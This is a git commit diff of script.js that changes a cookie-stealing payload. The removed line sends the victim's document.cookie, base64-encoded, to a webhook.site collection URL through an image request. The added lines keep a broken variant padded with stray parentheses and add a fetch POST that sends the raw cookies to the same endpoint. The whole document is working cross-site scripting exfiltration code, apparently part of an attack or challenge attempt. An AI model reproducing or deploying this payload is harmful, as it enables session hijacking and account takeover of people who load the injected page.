c107eb1f6b59ac148b7b5125318a46f84ed3bb9a
exortas <exortas@kali.flufferpuff.com>
2026-02-17 16:41:34 +0200

    update script

--- script.js
+++ script.js
@@ -1,1 +1,2 @@
-x = new Image(); x.src = 'https://webhook.site/9a1ca279-6285-4ed8-b7c5-1e7b729c94b2?data='+btoa(document.cookie);
+x = new Image(); x.src = '?data='+btoa(document.cookie);((((((((((()))))))))))
+fetch("https://webhook.site/9a1ca279-6285-4ed8-b7c5-1e7b729c94b2", {method: "POST", mode:"no-cors", body: document.cookie})
